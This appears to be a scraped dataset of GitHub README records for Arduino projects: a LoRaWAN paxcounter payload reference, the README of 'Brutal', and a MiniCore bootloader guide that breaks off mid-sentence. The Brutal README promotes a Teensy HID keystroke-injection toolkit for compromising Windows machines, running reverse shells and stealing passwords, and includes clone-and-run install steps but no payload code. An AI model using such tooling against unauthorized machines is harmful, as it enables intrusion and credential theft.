find some ready-to-go decoders which you may copy to your ttn console:\nplain_decoder.js | plain_converter.js | packed_decoder.js | packed_converter.js\nport #1: paxcount data\nbyte 1-2:number of unique devices, seen on wifi [00 00 if wifi scan disabled]\nbyte 3-4:number of unique devices, seen on bluetooth [ommited if bt scan disabled]\nport #2: device status query result\nbyte 1-2:battery or usb voltage [mv], 0 if no battery probe\nbyte 3-10:uptime [seconds]\nbyte 11: cpu temperature [\u00b0c]\nbytes 12-15:free ram [bytes]\nbyte 16:last cpu core 0 reset reason\nbytes 17-20:number of restarts since last power cycle\nport #3: device configuration query result\nbyte 1:lora sf (7..12) [default 9]\nbyte 2:lora txpower (2..15) [default 15]\nbyte 3:lora adr (1=on, 0=off) [default 1]\nbyte 4:screensaver status (1=on, 0=off) [default 0]\nbyte 5:display status (1=on, 0=off) [default 0]\nbyte 6:counter mode (0=cyclic unconfirmed, 1=cumulative, 2=cyclic confirmed) [default 0]\nbytes 7-8:rssi limiter threshold value (negative) [default 0]\nbyte 9:lora payload send cycle in seconds/2 (0..255) [default 120]\nbyte 10:wifi channel hopping interval in seconds/100 (0..255), 0 means no hopping [default 50]\nbyte 11:bluetooth channel switch interval in seconds/100 (0..255) [efault 10]\nbyte 12:bluetooth scanner status (1=on, 0=0ff) [default 1]\nbyte 13:wifi antenna switch (0=internal, 1=external) [default 0]\nbyte 14:count randomizated macs only (0=disabled, 1=enabled) [default 1]\nbyte 15:rgb led luminosity (0..100 %) [default 30]\nbyte 16:0 (reserved)\nbyte 17:0 (reserved)\nbytes 18-28:software version (ascii format, terminating with zero)\nport #4: gps data (only if device has fature gps, and gps data is enabled and gps has a fix)\nbytes 1-4:latitude\nbytes 5-8:longitude\nbyte 9:number of satellites\nbytes 10-11:hdop\nbytes 12-13:altitude [meter]\nport #5: button pressed alarm\nbyte 1:static value 0x01\nport #6: (unused)\nport #7: environmental sensor data (only if device has feature bme)\nbytes 1-2:temperature [\u00b0c]\nbytes 3-4:pressure [hpa]\nbytes 5-6:humidity [%]\nbytes 7-8:indoor air quality index (0..500), see below\nindoor air quality classification:\n0-50good\n51-100average\n101-150 little bad\n151-200 bad\n201-300 worse\n301-500 very bad\nport #8: battery voltage data (only if device has feature batt)\nbytes 1-2:battery or usb voltage [mv], 0 if no battery probe\nport #9: time/date\nbytes 1-4:board's local time/date in unix epoch (number of seconds that have elapsed since january 1, 1970 (midnight utc/gmt), not counting leap seconds)\nports #10, #11, #12: user sensor data\nformat is specified by user in function `sensor_read(uint8_t sensor)`, see `src/sensor.cpp`. port #10 is also used for ens counter (2 bytes = 16 bit), if ens is compiled and ens data transfer is enabled\nremote control\nthe device listenes for remote control commands on lorawan port 2. multiple commands per downlink are possible by concatenating them, but must not exceed a maximum of 10 bytes per downlink.\nnote: settings can be stored in nvram to make them persistant (reloaded during device startup / restart). to store settings, use command 0x21.\nsend for example 83 86 as downlink on port 2 to get battery status and time/date from the device.\n0x01 set scan rssi limit\n1 ... 255 used for wifi and bluetooth scan radius (greater values increase scan radius, values 50...110 make sense)\n0 = rssi limiter disabled [default]\n0x02 set counter mode\n0 = cyclic unconfirmed, mac counter reset after each wifi scan cycle, data is sent only once [default]\n1 = cumulative counter, mac counter is never reset\n2 = cyclic confirmed, like 0 but data is resent until confirmation by network received\n0x03 set gps data on/off\n0 = gps data off\n1 = gps data on, sends gps data on port 4 (default, use port 1 for mobile pax counter), if gps is present and has a fix\n0x04 set display on/off\n0 = display off\n1 = display on [default]\n0x05 set lora datarate\n0 ... 15 see lorawan regional parameters for details [default: 5]\nexample for eu868:\ndatarateconfigurationbit/s\n0lora: sf12 / 125 khz250\n1lora: sf11 / 125 khz440\n2lora: sf10 / 125 khz980\n3lora: sf9 / 125 khz1760\n4lora: sf8 / 125 khz3125\n5lora: sf7 / 125 khz5470\n6*lora: sf7 / 250 khz11000\n7*fsk: 50 kbps50000\n8 .. 14reserved for future use (rfu)\n15ignored (device keeps current setting)\n*) not supported by thethingsnetwork\n0x06 set lora txpower\n0 ... 255 desired tx power in dbm [default: 14]\n0x07 set lora adaptive data rate mode\n0 = adr off\n1 = adr on [default]\nif adr is set to off, sf value is shown inverted on display.\n0x08 do nothing\nuseful to clear pending commands from lorawan server quere, or to check rssi on device\n0x09 reset functions (send this command unconfirmed only to avoid boot loops!)\n0 = restart device (coldstart)\n1 = (reserved, currently does nothing)\n2 = reset device to factory settings and restart device\n3 = flush send queues\n4 = restart device (warmstart)\n8 = reboot device to maintenance mode (local web server)\n9 = reboot device to ota update via wifi mode\n0x0a set payload send cycle\n5 ... 255 payload send cycle in seconds/2\ne.g. 120 -> payload is transmitted each 240 seconds [default]\n0x0b set wifi channel hopping interval timer\n0 ... 255 duration for scanning a wifi channel in seconds/100\ne.g. 50 -> each channel is scanned for 500 milliseconds [default]\n0 means no hopping, scanning on fixed single channel wifi_channel_1\n0x0c set bluetooth channel switch interval timer\n0 ... 255 duration for scanning a bluetooth advertising channel in seconds/100\ne.g. 8 -> each channel is scanned for 80 milliseconds [default]\n0x0e set bluetooth scanner\n0 = disabled\n1 = enabled [default]\n0x0f set wifi antenna switch (works on lopy/lopy4/fipy only)\n0 = internal antenna [default]\n1 = external antenna\n0x10 set rgb led luminosity (works on lopy/lopy4/fipy and loranode32 shield only)\n0 ... 100 percentage of luminosity (100% = full light)\ne.g. 50 -> 50% of luminosity [default]\n0x13 set user sensor mode\nbyte 1 = user sensor number (1..3)\nbyte 2 = sensor mode (0 = disabled / 1 = enabled [default])\n0x14 set payload mask\nbyte 1 = sensor data payload mask (0..255, meaning of bits see below)\n0x01 = count_data\n0x02 = reserved_data\n0x04 = mems_data\n0x08 = gps_data\n0x10 = sensor_1_data (also ens counter)\n0x20 = sensor_2_data\n0x40 = sensor_3_data\n0x80 = batt_data\nbytes can be combined eg count_data + sensor_1_data + batt_data: `0x01 | 0x10 | 0x80 = 0x91`\n0x15 set bme data on/off\n0 = bme data off\n1 = bme data on, sends bme data on port 7 [default]\n0x16 set battery data on/off\n0 = battery data off [default]\n1 = battery data on, sends voltage on port 8\n0x17 set wifi scanner\n0 = disabled\n1 = enabled [default]\n0x18 set ens counter on/off\n0 = disabled [default]\n1 = enabled\n0x19 set sleep cycle\nbytes 1..2 = device sleep cycle in seconds/10 (msb), 1 ... 255\ne.g. {0x04, 0xb0} -> device sleeps 20 minutes after each send cycle [default = 0]\n0x20 load device configuration\ncurrent device runtime configuration will be loaded from nvram, replacing current settings immediately (use with care!)\n0x21 store device configuration\ncurrent device runtime configuration is stored in nvram, will be reloaded after restart\n0x80 get device configuration\ndevice answers with it's current configuration on port 3.\n0x81 get device status\ndevice answers with it's current status on port 2.\n0x83 get battery status\ndevice answers with battery voltage on port 8.\n0x84 get device gps status\ndevice answers with it's current status on port 4.\n0x85 get bme280 / bme680 sensor data\ndevice answers with bme sensor data set on port 7.\n0x86 get time/date\ndevice answers with it's current time on port 2:\nbytes 1..4 = time/date in utc epoch seconds (lsb)\nbyte 5 = time source & status, see below\nbits 0..3 last seen time source\n0x00 = gps\n0x01 = rtc\n0x02 = lora\n0x03 = unsynched (never synched)\n0x04 = set (source unknown)\nbits 4..7 time status\n0x00 = timenotset (never synched)\n0x01 = timeneedssync (last sync failed)\n0x02 = timeset (synched)\n0x87 sync time/date\ndevice synchronizes it's time/date by calling the preconfigured time source.\n0x88 set time/date\nbytes 1..4 = time/date to set in utc epoch seconds (msb, e.g. https://www.epochconverter.com/hex)\nlicense\ncopyright 2018-2020 oliver brandmueller ob@sysadm.in\ncopyright 2018-2020 klaus wilting verkehrsrot@arcor.de\nlicensed under the apache license, version 2.0 (the \"license\"); you may not use this file except in compliance with the license. you may obtain a copy of the license at\nhttp://www.apache.org/licenses/license-2.0\nunless required by applicable law or agreed to in writing, software distributed under the license is distributed on an \"as is\" basis, without warranties or conditions of any kind, either express or implied. see the license for the specific language governing permissions and limitations under the license.\nnotice: parts of the source files in this repository are made available under different licenses, see file license.txt in this repository. refer to each individual source file for more details.\ncredits\nthanks to\noliver brandm\u00fcller for idea and initial setup of this project\ncharles hallard for major code contributions to this project\nrobbi5 for the payload converter\ncaspar armster for the the things stack v3 payload converter\nterrillmoore for maintaining the lmic for arduino lorawan stack\nsbamueller for writing the tutorial in make magazine\nstefan for paxcounter opensensebox integration\naugust quint for adding sd card data logger, sds011 and ens support", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000048, "year": null}, {"Unnamed: 0": 2103, "autor": 63, "date": null, "content": "Now Teensy can be use for penetration\nTeensy like a rubber ducky , why im choose teensy ? because the price very cheap for me . t\u2019s extremely useful for executing scripts on a target machine without the need for human-to-keyboard interaction ( HID -ATTACK ) .When you insert the device, it will be detected as a keyboard, and using the microprocessor and onboard flash memory storage, you can send a very fast set of keystrokes to the target\u2019s machine and completely compromise it, regardless of autorun. I\u2019ve used it in my security testing to run recon or enumeration scripts, execute reverse shells, exploit local DLL hijack/privilege escalation vulnerabilities, and get all password . Now im develop new tools the name is Brutal\nBrutal\nBrutal is a toolkit to quickly create various payload,powershell attack , virus attack and launch listener for a Human Interface Device\nDonate\nIf this project very help you to penetration testing and u want support me , you can give me a cup of coffee :)\nScreenshoot\nVideo\nCheck this video https://www.youtube.com/watch?v=WaqY-pQpuV0\nDo you want like a mr robot hacking scene when Angela moss plug usb into computer for get credential information ? you can choose payload in brutal ( optional 3 or 4 )\nThe Goal\nGenerate various payload and powershell attack without coding\nTo help breaking computer very fast and agile :p\nThe Payloads Compatibility > target Windows machines only\nRequirements\nArduino Software ( I used v1.6.7 )\nTeensyDuino\nLinux udev rules\nHow install all requirements ? Visit This Wiki\nSupported Hardware\nThe following hardware has been tested and is known to work.\nTeensy 3.x\nUsb Cable\n\ud83d\udcdc Changelog\nBe sure to check out the [Changelog] and Read CHANGELOG.md\nGetting Started\nCopy and paste the PaensyLib folder inside your Arduino\\libraries\ngit clone https://github.com/Screetsec/Brutal.git\ncd Brutal\nchmod +x Brutal.sh\nsudo ./Brutal.sh or sudo su ./Brutal.sh\nBUG ?\nSubmit new issue\nContact me\nHey sup ? do you want ask about all my tools ? you can join me in telegram.me/offscreetsec\nDonations\nDonation: Send to bitcoin\nAddres Bitcoin : 1NuNTXo7Aato7XguFkvwYnTAFV2immXmjS\nCredits\nThanks to allah and Screetsec [ Edo -maland- ]\nDracos Linux from Scratch Indonesia ( Awesome Penetration os ), you can see in http://dracos-linux.org/\nOffensive Security for the awesome OS ( http://www.offensive-security.com/ )\nhttp://www.kali.org/\nJack Wilder admin in http://www.linuxsec.org\nAnd another open sources tool in github\nUptodate new tools hacking visit http://www.kitploit.com\nDisclaimer\nNote: modifications, changes, or alterations to this sourcecode is acceptable, however,any public releases utilizing this code must be approved by writen this tool ( Edo -m- ).", "link": "https://github.com/screetsec/Brutal", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "now teensy can be use for penetration\nteensy like a rubber ducky , why im choose teensy ? because the price very cheap for me . t\u2019s extremely useful for executing scripts on a target machine without the need for human-to-keyboard interaction ( hid -attack ) .when you insert the device, it will be detected as a keyboard, and using the microprocessor and onboard flash memory storage, you can send a very fast set of keystrokes to the target\u2019s machine and completely compromise it, regardless of autorun. i\u2019ve used it in my security testing to run recon or enumeration scripts, execute reverse shells, exploit local dll hijack/privilege escalation vulnerabilities, and get all password . now im develop new tools the name is brutal\nbrutal\nbrutal is a toolkit to quickly create various payload,powershell attack , virus attack and launch listener for a human interface device\ndonate\nif this project very help you to penetration testing and u want support me , you can give me a cup of coffee :)\nscreenshoot\nvideo\ncheck this video https://www.youtube.com/watch?v=waqy-pqpuv0\ndo you want like a mr robot hacking scene when angela moss plug usb into computer for get credential information ? you can choose payload in brutal ( optional 3 or 4 )\nthe goal\ngenerate various payload and powershell attack without coding\nto help breaking computer very fast and agile :p\nthe payloads compatibility > target windows machines only\nrequirements\narduino software ( i used v1.6.7 )\nteensyduino\nlinux udev rules\nhow install all requirements ? visit this wiki\nsupported hardware\nthe following hardware has been tested and is known to work.\nteensy 3.x\nusb cable\n\ud83d\udcdc changelog\nbe sure to check out the [changelog] and read changelog.md\ngetting started\ncopy and paste the paensylib folder inside your arduino\\libraries\ngit clone https://github.com/screetsec/brutal.git\ncd brutal\nchmod +x brutal.sh\nsudo ./brutal.sh or sudo su ./brutal.sh\nbug ?\nsubmit new issue\ncontact me\nhey sup ? do you want ask about all my tools ? you can join me in telegram.me/offscreetsec\ndonations\ndonation: send to bitcoin\naddres bitcoin : 1nuntxo7aato7xgufkvwyntafv2immxmjs\ncredits\nthanks to allah and screetsec [ edo -maland- ]\ndracos linux from scratch indonesia ( awesome penetration os ), you can see in http://dracos-linux.org/\noffensive security for the awesome os ( http://www.offensive-security.com/ )\nhttp://www.kali.org/\njack wilder admin in http://www.linuxsec.org\nand another open sources -----> tool !!!  in github\nuptodate new tools hacking visit http://www.kitploit.com\ndisclaimer\nnote: modifications, changes, or alterations to this sourcecode is acceptable, however,any public releases utilizing this code must be approved by writen this -----> tool !!!  ( edo -m- ).", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000063, "year": null}, {"Unnamed: 0": 2112, "autor": 72, "date": null, "content": "MiniCore\nAn Arduino core for the ATmega328, ATmega168, ATmega88, ATmega48 and ATmega8, all running a custom version of Optiboot for increased functionality. This core requires at least Arduino IDE v1.6.2, where v1.8.5+ is recommended.\nThis core gives you two extra IO pins if you're using the internal oscillator! PB6 and PB7 is mapped to Arduino pin 20 and 21.\nIf you're into \"generic\" AVR programming, I'm happy to tell you that all relevant keywords are being highlighted by the IDE through a separate keywords file. Make sure to test the example files (File > Examples > AVR C code examples). Try writing a register name, DDRB for instance, and see for yourself!\nTable of contents\nSupported microcontrollers\nSupported clock frequencies\nBootloader option\nBOD option\nEEPROM retain option\nLink time optimization / LTO\nPrintf support\nPin macros\nWrite to own flash\nProgrammers\nHow to install\nBoards Manager Installation\nManual Installation\nPlatformIO\nGetting started with MiniCore\nWiring reference\nPinout\nMinimal setup\nSupported microcontrollers:\nATmega8\nATmega48\nATmega88\nATmega168\nATmega328\n* All variants (A, P, PA and PB)\nCan't decide what microcontroller to choose? Have a look at the specification table below:\nATmega328 ATmega168 ATmega88 ATmega48 ATmega8\nFlash 32kB 16kB 8kB 4kB 8kB\nRAM 2kB 1kB 1kB 512B 1kB\nEEPROM 1kB 512B 512B 256B 512B\nPWM pins 6/9* 6 6 6 3\n* ATmega328PB has 9 PWM pins\nSupported clock frequencies\nMiniCore supports a variety of different clock frequencies. Select the microcontroller in the boards menu, then select the clock frequency. You'll have to hit \"Burn bootloader\" in order to set the correct fuses and upload the correct bootloader. Make sure you connect an ISP programmer, and select the correct one in the \"Programmers\" menu. For time critical operations an external crystal/oscillator is recommended.\nYou might experience upload issues when using the internal oscillator. It's factory calibrated but may be a little \"off\" depending on the calibration, ambient temperature and operating voltage. If uploading failes while using the 8 MHz internal oscillator you have these options:\nEdit the baudrate line in the boards.txt file, and choose either 115200, 57600, 38400 or 19200 baud.\nUpload the code using a programmer (USBasp, USBtinyISP etc.)\nUse the 4, 2 or 1 MHz option instead\nFrequency Oscillator type Comment\n16 MHz External crystal/oscillator Default clock on most AVR based Arduino boards and MiniCore\n20 MHz External crystal/oscillator\n18.4320 MHz External crystal/oscillator Great clock for UART communication with no error\n14.7456 MHz External crystal/oscillator Great clock for UART communication with no error\n12 MHz External crystal/oscillator Useful when working with USB 1.1 (12 Mbit/s)\n11.0592 MHz External crystal/oscillator Great clock for UART communication with no error\n8 MHz External crystal/oscillator Common clock when working with 3.3V\n7.3728 MHz External crystal/oscillator Great clock for UART communication with no error\n4 MHz External crystal/oscillator\n3.6864 MHz External crystal/oscillator Great clock for UART communication with no error\n2 MHz External crystal/oscillator\n1.8432 MHz External crystal/oscillator Great clock for UART communication with no error\n1 MHz External crystal/oscillator\n8 MHz Internal oscillator Might cause UART upload issues. See comment above this table\n4 MHz Internal oscillator Derived from the 8 MHz internal oscillator\n2 MHz Internal oscillator Derived from the 8 MHz internal oscillator\n1 MHz Internal oscillator Derived from the 8 MHz internal oscillator\nBootloader option\nMiniCore lets you select which serial port you want to use for uploading. UART0 is the default port for all targets, but ATmega328PB can also use UART1. If your application doesn't need or require a bootloader for uploading code you can also choose to disable this by selecting No bootloader. This frees 512 bytes of flash memory. Unline official Arduino AVR boards, the bootloader isn't automatically removed when you upload using a programmer. You'll have to select No bootloader hit \"upload\" or the \"burn bootloader\" for this to happen.\nNote that you have need to connect a programmer and hit Burn bootloader if you want to change any of the Upload port settings.\nBOD option\nBrown out detection, or BOD for short lets the microcontroller sense the input voltage and shut down if the voltage goes below the brown out setting. To change the BOD settings you'll have to connect an ISP programmer and hit \"Burn bootloader\". Below is a table that shows the available BOD options:\nATmega328 ATmega168 ATmega88 ATmega48 ATmega8\n4.3V 4.3V 4.3V 4.3V 4.0V\n2.7V 2.7V 2.7V 2.7V 2.7V\n1.8V 1.8V 1.8V 1.8V -\nDisabled Disabled Disabled Disabled Disabled\nEEPROM option\nIf you want the EEPROM to be erased every time you burn the bootloader or upload using a programmer, you can turn off this option. You'll have to connect an ISP programmer and hit \"Burn bootloader\" to enable or disable EEPROM retain. Note that when uploading using a bootloader, the EEPROM will always be retained.\nLink time optimization / LTO\nAfter Arduino IDE 1.6.11 where released, There have been support for link time optimization or LTO for short. The LTO optimizes the code at link time, making the code (often) significantly smaller without making it \"slower\". In Arduino IDE 1.6.11 and newer LTO is enabled by default. I've chosen to disable this by default to make sure the core keep its backwards compatibility. Enabling LTO in IDE 1.6.10 or older will return an error. I encourage you to try the new LTO option and see how much smaller your code gets! Note that you don't need to hit \"Burn Bootloader\" in order to enable LTO. Simply enable it in the \"Tools\" menu, and your code is ready for compilation. If you want to read more about LTO and GCC flags in general, head over to the GNU GCC website!\nPrintf support\nUnlike the official Arduino cores, MiniCore has printf support out of the box. If you're not familiar with printf you should probably read this first. It's added to the Print class and will work with all libraries that inherit Print. Printf is a standard C function that lets you format text much easier than using Arduino's built-in print and println. Note that this implementation of printf will NOT print floats or doubles. This is a limitation of the avr-libc printf implementation on AVR microcontrollers, and nothing I can easily fix.\nIf you're using a serial port, simply use Serial.printf(\"Milliseconds since start: %ld\\n\", millis());. You can also use the F() macro if you need to store the string in flash. Other libraries that inherit the Print class (and thus supports printf) are the LiquidCrystal LCD library and the U8G2 graphical LCD library.\nPin macros\nNote that you don't have to use the digital pin numbers to refer to the pins. You can also use some predefined macros that maps \"Arduino pins\" to the port and port number:\n// Use PIN_PB5 macro to refer to pin PB5 (Arduino pin 13)\ndigitalWrite(PIN_PB5, HIGH);\n// Results in the exact same compiled code\ndigitalWrite(13, HIGH);\nWrite to own flash\nMiniCore uses Optiboot Flash, a bootloader that supports flash writing within the running application, thanks to the work of @majekw. This means that content from e.g. a sensor can be stored in the flash memory directly without the need of external memory. Flash memory is much faster than EEPROM, and can handle at least 10 000 write cycles before wear becomes an issue. For more information on how it works and how you can use this in you own application, check out the Serial_read_write for a simple proof-of-concept demo, and Flash_put_get + Flash_iterate for useful examples on how you can store strings, structs and variables to flash and retrieve then afterwards. The Read_write_without_buffer example demonstrate how you can read and write to the flash memory on a lower level without using a RAM buffer.\nProgrammers\nMiniCore does not adds its own copies of all the standard programmers to the \"Programmer\" menu. Just select one of the stock programmers in the \"Programmers\" menu, and you're ready to \"Burn Bootloader\" or \"Upload Using Programmer\".\nSelect your microcontroller in the boards menu, then select the clock frequency. You'll have to hit \"Burn bootloader\" in order to set the correct fuses and upload the correct bootloader.\nMake sure you connect an ISP programmer, and select the correct one in the \"Programmers\" menu. For time critical operations an external oscillator is recommended.\nHow to install\nBoards Manager Installation\nThis installation method requires Arduino IDE version 1.6.4 or greater.\nOpen the Arduino IDE.\nOpen the File > Preferences menu item.\nEnter the following URL in Additional Boards Manager URLs:\nhttps://mcudude.github.io/MiniCore/package_MCUdude_MiniCore_index.json\nOpen the Tools > Board > Boards Manager... menu item.\nWait for the platform indexes to finish downloading.\nScroll down until you see the MiniCore entry and click on it.\nClick Install.\nAfter installation is complete close the Boards Manager window.\nNote: If you plan to use the *PB series, you need the latest version of the Arduino toolchain. This toolchain is available through IDE 1.8.6 or newer. Here's how you install/enable the toolchain:\nOpen the Tools > Board > Boards Manager... menu item.\nWait for the platform indexes to finish downloading.\nThe top is named Arduino AVR boards. Click on this item.\nMake sure the latest version is installed and selected\nClose the Boards Manager window.\nManual Installation\nClick on the \"Download ZIP\" button in the upper right corner. Exctract the ZIP file, and move the extracted folder to the location \"~/Documents/Arduino/hardware\". Create the \"hardware\" folder if it doesn't exist. Open Arduino IDE, and a new category in the boards menu called \"MiniCore\" will show up.\nPlatformIO\nPlatformIO is an open source ecosystem for IoT development and supports MiniCore.\n*See PlatformIO.md for more information.\nGetting started with MiniCore\nOk, so you're downloaded and installed MiniCore, but how to get started? Here's a quick guide:\nHook up your microcontroller as shown in the pinout diagram, or simply just plut it into an Arduino UNO board.\n(If you're not planning to use the bootloader (uploading code using a USB to serial adapter), the FTDI header and the 100 nF capacitor on the reset pin can be omitted.)\nOpen the Tools > Board menu item, and select a MiniCore compatible microcontroller.\nIf the BOD option is presented, you can select at what voltage the microcontroller will shut down at. Read more about BOD here.\nSelect your prefered clock frequency. 16 MHz is standard on most Arduino boards, including the Arduino UNO.\nSelect what kind of programmer you're using under the Programmers menu.\nIf the Variants option is presented, you'll have to specify what version of the microcontroller you're using. E.g the ATmega328 and the ATmega328P got different device signatures, so selecting the wrong one will result in an error.\nHit Burn Bootloader. If an LED is connected to pin PB5 (Arduino pin 13), it should flash twice every second.\nNow that the correct fuse settings is sat and the bootloader burnt, you can upload your code in two ways:\nDisconnect your programmer tool, and connect a USB to serial adapter to the microcontroller, like shown in the minimal setup circuit. Then select the correct serial port under the Tools menu, and click the Upload button. If you're getting some kind of timeout error, it means your RX and TX pins are swapped, or your auto reset circuity isn't working properly (the 100 nF capacitor on the reset line).\nKeep your programmer connected, and hold down the shift button while clicking Upload. This will erase the bootloader and upload your code using the programmer tool.\nYour code should now be running on your microcontroller! If you experience any issues related to bootloader burning or serial uploading, please use this forum post or create an issue on Github.\nWiring reference\nTo extend this core's functionality a bit futher, I've added a few missing Wiring functions. As many of you know Arduino is based on Wiring, but that doesn't mean the Wiring development isn't active. These functions are used as \"regular\" Arduino functions, and there's no need to include an external library.\nI hope you find this useful, because they really are!\nFunction list\nportMode()\nportRead()\nportWrite()\nsleepMode()\nsleep()\nnoSleep()\nenablePower()\ndisablePower()\nFor further information please view the Wiring reference page!\nPinout\nThis core uses the standard Arduino UNO pinout and will not break compatibility of any existing code or libraries. What's different about this pinout compared to the original one is that this got three aditinal IO pins available. You can use digital pin 20 and 21 (PB6 and PB7) as regular IO pins if you're ussing the internal oscillator instead of an external crystal. If you're willing to disable the reset pin (can be enabled using high voltage parallel programming) it can be used as a regular IO pin, and is assigned to digital pin 22 (PC6). Click to enlarge:\nDIP-28 package ATmega8/48/88/168/328 TQFP-32 SMD package ATmega8/48/88/168/328 TQFP-32 SMD package ATmega48/88/168/328PB\nMinimal setup\nHere is a simple schematic showing a minimal setup using an external crystal. Skip the crystal and the two 22pF capacitors if you're using the internal oscillator. If you don't want to mess with breadboards, components and wiring; simply use your Arduino UNO! Click to enlarge:\nDIP-28 package ATmega8/48/88/168/328 TQFP-32 SMD package ATmega8/48/88/168/328 TQFP-32 SMD package ATmega48/88/168/328PB", "link": "https://github.com/MCUdude/MiniCore", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "minicore\nan arduino core for the atmega328, atmega168, atmega88, atmega48 and atmega8, all running a custom version of optiboot for increased functionality. this core requires at least arduino ide v1.6.2, where v1.8.5+ is recommended.\nthis core gives you two extra io pins if you're using the internal oscillator! pb6 and pb7 is mapped to arduino pin 20 and 21.\nif you're into \"generic\" avr programming, i'm happy to tell you that all relevant keywords are being highlighted by the ide through a separate keywords file. make sure to test the example files (file > examples > avr c code examples). try writing a register name, ddrb for instance, and see for yourself!\ntable of contents\nsupported microcontrollers\nsupported clock frequencies\nbootloader option\nbod option\neeprom retain option\nlink time optimization / lto\nprintf support\npin macros\nwrite to own flash\nprogrammers\nhow to install\nboards manager installation\nmanual installation\nplatformio\ngetting started with minicore\nwiring reference\npinout\nminimal setup\nsupported microcontrollers:\natmega8\natmega48\natmega88\natmega168\natmega328\n* all variants (a, p, pa and pb)\ncan't decide what microcontroller to choose? have a look at the specification table below:\natmega328 atmega168 atmega88 atmega48 atmega8\nflash 32kb 16kb 8kb 4kb 8kb\nram 2kb 1kb 1kb 512b 1kb\neeprom 1kb 512b 512b 256b 512b\npwm pins 6/9* 6 6 6 3\n* atmega328pb has 9 pwm pins\nsupported clock frequencies\nminicore supports a variety of different clock frequencies. select the microcontroller in the boards menu, then select the clock frequency. you'll have to hit \"burn bootloader\" in order to set the correct fuses and upload the correct bootloader. make sure you connect an isp programmer, and select the correct one in the \"programmers\" menu. for time critical operations an external crystal/oscillator is recommended.\nyou might experience upload issues when using the internal oscillator. it's factory calibrated but may be a little \"off\" depending on the calibration, ambient temperature and operating voltage. if uploading failes while using the 8 mhz internal oscillator you have these options:\nedit the baudrate line in the boards.txt file, and choose either 115200, 57600, 38400 or 19200 baud.\nupload the code using a programmer (usbasp, usbtinyisp etc.)\nuse the 4, 2 or 1 mhz option instead\nfrequency oscillator type comment\n16 mhz external crystal/oscillator default clock on most avr based arduino boards and minicore\n20 mhz external crystal/oscillator\n18.4320 mhz external crystal/oscillator great clock for uart communication with no error\n14.7456 mhz external crystal/oscillator great clock for uart communication with no error\n12 mhz external crystal/oscillator useful when working with usb 1.1 (12 mbit/s)\n11.0592 mhz external crystal/oscillator great clock for uart communication with no error\n8 mhz external crystal/oscillator common clock when working with 3.3v\n7.3728 mhz external crystal/oscillator great clock for uart communication with no error\n4 mhz external crystal/oscillator\n3.6864 mhz external crystal/oscillator great clock for uart communication with no error\n2 mhz external crystal/oscillator\n1.8432 mhz external crystal/oscillator great clock for uart communication with no error\n1 mhz external crystal/oscillator\n8 mhz internal oscillator might cause uart upload issues. see comment above this table\n4 mhz internal oscillator derived from the 8 mhz internal oscillator\n2 mhz internal oscillator derived from the 8 mhz internal oscillator\n1 mhz internal oscillator derived from the 8 mhz internal oscillator\nbootloader option\nminicore lets you select which serial port you want to use for uploading. uart0 is the default port for all targets, but atmega328pb can also use uart1. if your application doesn't need or require a bootloader for uploading code you can also choose to disable this by selecting no bootloader. this frees 512 bytes of flash memory. unline official arduino avr boards, the bootloader isn't automatically removed when you upload using a programmer. you'll have to select no bootloader hit \"upload\" or the \"burn bootloader\" for this to happen.\nnote that you have need to connect a programmer and hit burn bootloader if you want to change any of the upload port settings.\nbod option\nbrown out detection, or bod for short lets the microcontroller sense the input voltage and shut down if the voltage goes below the brown out setting. to change the bod settings you'll have to connect an isp programmer and hit \"burn bootloader\". below is a table that shows the available bod options:\natmega328 atmega168 atmega88 atmega48 atmega8\n4.3v 4.3v 4.3v 4.3v 4.0v\n2.7v 2.7v 2.7v 2.7v 2.7v\n1.8v 1.8v 1.8v 1.8v -\ndisabled disabled disabled disabled disabled\neeprom option\nif you want the eeprom to be erased every time you burn the bootloader or upload using a programmer, you can turn off this option. you'll have to connect an isp programmer and hit \"burn bootloader\" to enable or disable eeprom retain. note that when uploading using a bootloader, the eeprom will always be retained.\nlink time optimization / lto\nafter arduino ide 1.6.11 where released, there have been support for link time optimization or lto for short. the lto optimizes the code at link time, making the code (often) significantly smaller without making it \"slower\". in arduino ide 1.6.11 and newer lto is enabled by default. i've chosen to disable this by default to make sure the core keep its backwards compatibility. enabling lto in ide 1.6.10 or older will return an error. i encourage you to try the new lto option and see how much smaller your code gets! note that you don't need to hit \"burn bootloader\" in order to enable lto. simply enable it in the \"tools\" menu, and your code is ready for compilation. if you want to read more about lto and gcc flags in general, head over to the gnu gcc website!\nprintf support\nunlike the official arduino cores, minicore has printf support out of the box. if you're not familiar with printf you should probably read this first. it's added to the print class and will work with all libraries that inherit print. printf is a standard c function that lets you format text much easier than using arduino's built-in print and println. note that this implementation of printf will not print floats or doubles. this is a limitation of the avr-libc printf implementation on avr microcontrollers, and nothing i can easily fix.\nif you're using a serial port, simply use serial.printf(\"milliseconds since start: %ld\\n\", millis());. you can also use the f() macro if you need to store the string in flash. other libraries that inherit the print class (and thus supports printf) are the liquidcrystal lcd library and the u8g2 graphical lcd library.\npin macros\nnote that you don't have to use the digital pin numbers to refer to the pins. you can also use some predefined macros that maps \"arduino pins\" to the port and port number:\n// use pin_pb5 macro to refer to pin pb5 (arduino pin 13)\ndigitalwrite(pin_pb5, high);\n// results in the exact same compiled code\ndigitalwrite(13, high);\nwrite to own flash\nminicore uses optiboot flash, a bootloader that supports flash writing within the running application, thanks to the work of @majekw. this means that content from e.g. a sensor can be stored in the flash memory directly without the need of external memory. flash memory is much faster than eeprom, and can handle at least 10 000 write cycles before wear becomes an issue. for more information on how it works and how you can use this in you own application, check out the serial_read_write for a simple proof-of-concept demo, and flash_put_get + flash_iterate for useful examples on how you can store strings, structs and variables to flash and retrieve then afterwards. the read_write_without_buffer example demonstrate how you can read and write to the flash memory on a lower level without using a ram buffer.\nprogrammers\nminicore does not adds its own copies of all the standard programmers to the \"programmer\" menu. just select one of the stock programmers in the \"programmers\" menu, and you're ready to \"burn bootloader\" or \"upload using programmer\".\nselect your microcontroller in the boards menu, then select the clock frequency. you'll have to hit \"burn bootloader\" in order to set the correct fuses and upload the correct bootloader.\nmake sure you connect an isp programmer, and select the correct one in the \"programmers\" menu. for time critical operations an external oscillator is recommended.\nhow to install\nboards manager installation\nthis installation method requires 